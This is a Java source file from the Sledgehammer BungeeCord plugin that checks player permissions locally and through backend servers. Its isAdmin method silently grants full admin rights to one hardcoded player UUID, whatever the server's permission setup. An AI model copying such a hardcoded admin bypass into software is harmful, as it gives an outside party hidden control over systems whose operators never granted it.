/*
 * Copyright (c) 2020 Noah Husby
 * Sledgehammer [Bungeecord] - PermissionHandler.java
 *
 * Sledgehammer is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * Sledgehammer is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with Sledgehammer.  If not, see <https://github.com/noahhusby/Sledgehammer/blob/master/LICENSE/>.
 */

package com.noahhusby.sledgehammer.permissions;

import com.noahhusby.sledgehammer.Sledgehammer;
import com.noahhusby.sledgehammer.SledgehammerUtil;
import com.noahhusby.sledgehammer.network.P2S.P2SPermissionPacket;
import com.noahhusby.sledgehammer.network.SledgehammerNetworkManager;
import com.noahhusby.sledgehammer.players.SledgehammerPlayer;
import net.md_5.bungee.api.CommandSender;
import net.md_5.bungee.api.connection.ProxiedPlayer;
import org.json.simple.JSONObject;

import java.util.ArrayList;
import java.util.List;
import java.util.UUID;
import java.util.concurrent.TimeUnit;

public class PermissionHandler {

    private static PermissionHandler instance = null;

    public static PermissionHandler getInstance() {
        return instance == null ? instance = new PermissionHandler() : instance;
    }

    private PermissionHandler() {
        Sledgehammer.sledgehammer.alternativeThreads.scheduleAtFixedRate(this::checkPermissionRequests, 0, 500, TimeUnit.MILLISECONDS);
    }

    private List<PermissionRequest> requests = new ArrayList<>();

    /**
     * Checks if {@link CommandSender} is a Sledgehammer admin
     * @param sender {@link CommandSender}
     * @return True if admin, false if not
     */
    public boolean isAdmin(CommandSender sender) {
        return sender.hasPermission("sledgehammer.admin") || (sender instanceof ProxiedPlayer &&
                ((ProxiedPlayer) sender).getUniqueId().equals(UUID.fromString("4cfa7dc1-3021-42b0-969b-224a9656cc6d")));
    }

    /**
     * Checks if player has a given permission both globally and locally
     * @param player The player to check
     * @param permission The permission to be checked
     * @param response {@link PermissionResponse}
     */
    public void check(SledgehammerPlayer player, String permission, PermissionResponse response) {
        if(player == null) {
            response.onResponse(PermissionRequest.PermissionCode.NO_PERMISSION, false);
            return;
        }

        if(isAdmin(player) || player.hasPermission(permission)) {
            response.onResponse(PermissionRequest.PermissionCode.PERMISSION, true);
            return;
        }

        if(!player.onSledgehammer()) {
            response.onResponse(PermissionRequest.PermissionCode.NO_PERMISSION, false);
            return;
        }

        String salt = SledgehammerUtil.getSaltString();
        PermissionRequest request = new PermissionRequest(response, salt, System.currentTimeMillis(),
                1000);
        SledgehammerNetworkManager.getInstance().send(new P2SPermissionPacket(player.getServer().getInfo().getName(),
                player, permission, salt));
        requests.add(request);
    }

    /**
     * Called when a local server responds with a permission check
     * @param data Incoming json data from local server
     */
    public void response(JSONObject data) {
        String salt = (String) data.get("salt");
        boolean permission = (boolean) data.get("permission");

        PermissionRequest request = null;
        for(PermissionRequest r : requests)
            if(r.salt.equals(salt)) request =  r;
        if(request == null) return;

        request.response.onResponse(permission ? PermissionRequest.PermissionCode.PERMISSION : PermissionRequest.PermissionCode.NO_PERMISSION, false);
        requests.remove(request);
    }

    /**
     * Checks if responses are expired
     */
    private void checkPermissionRequests() {
        requests.removeIf(request -> {
            if(request.time + request.timeout < System.currentTimeMillis()) {
                request.response.onResponse(PermissionRequest.PermissionCode.TIMED_OUT, false);
                return true;
            }
            return false;
        });
    }
}
